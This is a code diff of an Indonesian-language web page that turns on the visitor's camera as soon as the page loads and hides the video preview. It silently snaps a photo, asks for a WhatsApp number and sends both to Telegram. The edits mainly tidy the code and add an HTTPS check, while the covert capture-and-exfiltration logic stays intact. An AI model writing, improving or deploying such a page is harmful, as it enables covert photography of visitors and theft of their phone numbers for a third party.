@@ -5,13 +5,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Capture & Kirim Telegram</title>
   <style>
-    video, canvas {
-      display: none;
-    }
-    #formContainer {
-      display: none;
-      margin-top: 20px;
-    }
+    video, canvas { display: none; }
+    #formContainer { display: none; margin-top: 20px; }
   </style>
 </head>
 <body>
@@ -35,12 +30,16 @@
 
     let photoBlob = null;
 
-    // Mulai kamera
     async function startCamera() {
+      // Cek HTTPS
+      if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
+        alert("Akses kamera hanya bisa dilakukan di HTTPS atau localhost.");
+        return;
+      }
+
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
-
         video.onloadedmetadata = () => {
           setTimeout(() => {
             canvas.width = video.videoWidth;
@@ -52,16 +51,15 @@
           }, 2000);
         };
       } catch (err) {
-        alert("Gagal mengakses kamera. Gunakan HTTPS atau jalankan di localhost.");
+        alert("Gagal mengakses kamera. Pastikan kamu mengizinkan kamera dan akses HTTPS.");
         console.error(err);
       }
     }
 
-    // Kirim ke Telegram
     function sendToTelegram() {
       const waNumber = document.getElementById("waNumber").value.trim();
       if (!waNumber || !photoBlob) {
-        alert("Harap isi nomor WhatsApp dan pastikan foto berhasil diambil.");
+        alert("Masukkan nomor WhatsApp dan pastikan foto berhasil diambil.");
         return;
       }
 
@@ -76,16 +74,15 @@
       })
         .then(res => res.json())
         .then(data => {
-          alert("Foto dan nomor WhatsApp berhasil dikirim ke Telegram.");
-          form.innerHTML = "<p>Data telah dikirim.</p>";
+          alert("Berhasil dikirim ke Telegram.");
+          form.innerHTML = "<p>Data terkirim.</p>";
         })
         .catch(err => {
           console.error("Gagal kirim ke Telegram:", err);
-          alert("Gagal kirim ke Telegram.");
+          alert("Gagal mengirim ke Telegram.");
         });
     }
 
-    // Konversi DataURL ke Blob
     function dataURLtoBlob(dataURL) {
       const arr = dataURL.split(',');
       const mime = arr[0].match(/:(.*?);/)[1];
@@ -98,7 +95,6 @@
       return new Blob([u8arr], { type: mime });
     }
 
-    // Jalankan kamera saat halaman dimuat
     window.onload = startCamera;
   </script>
 </body>
